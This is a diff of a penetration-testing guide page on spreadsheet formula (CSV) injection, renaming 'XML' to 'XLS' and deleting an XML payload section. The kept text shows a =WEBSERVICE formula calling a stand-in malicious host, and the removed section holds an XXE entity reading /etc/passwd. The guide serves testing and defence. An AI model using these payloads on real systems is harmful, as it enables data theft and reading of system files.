@@ -1,15 +1,15 @@
 ---
 description: >-
-  XML/CSV Injection, also known as Formula Injection or CSV Injection, occurs
+  XLS/CSV Injection, also known as Formula Injection or CSV Injection, occurs
   when a malicious user inputs data into an application that is later exported
-  to an XML or CSV file.
+  to an XLS or CSV file.
 ---
 
-# XML/CSV Injection
+# XLS/CSV Injection
 
-## Example Tests for XML/CSV Injection
+## Example Tests for XLS/CSV Injection
 
-When performing a penetration test, you can use various payloads to test for XML/CSV injection vulnerabilities. Below are some example commands and payloads that can be used to test if an application is vulnerable to XML/CSV injection.
+When performing a penetration test, you can use various payloads to test for XLS/CSV injection vulnerabilities. Below are some example commands and payloads that can be used to test if an application is vulnerable to XLS/CSV injection.
 
 ### **Example Payloads for CSV Injection**
 
@@ -29,27 +29,13 @@ When performing a penetration test, you can use various payloads to test for XML
     =WEBSERVICE("http://malicious-site.com/data")
     ```
 
-### **Example Payloads for XML Injection**
-
-1.  **Basic XML Injection**
-
-    ```xml
-    <name>&exfiltrate;</name>
-    ```
-2.  **Entity Injection**
-
-    ```xml
-    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-    <name>&xxe;</name>
-    ```
-
 ## Testing Methodology
 
 1. **Injecting Payloads**:
-   * Identify fields in the application where you can input data that will be exported to XML or CSV files.
+   * Identify fields in the application where you can input data that will be exported to XLS or CSV files.
    * Input the example payloads into these fields.
 2. **Export and Analysis**:
-   * Export the data to an XML or CSV file from the application.
+   * Export the data to an XLS or CSV file from the application.
    * Open the exported file with a text editor to verify that the payloads are correctly injected.
    * Open the file with a spreadsheet program (e.g., Microsoft Excel) to see if the payloads execute as formulas.
 3. **Observation and Mitigation**:
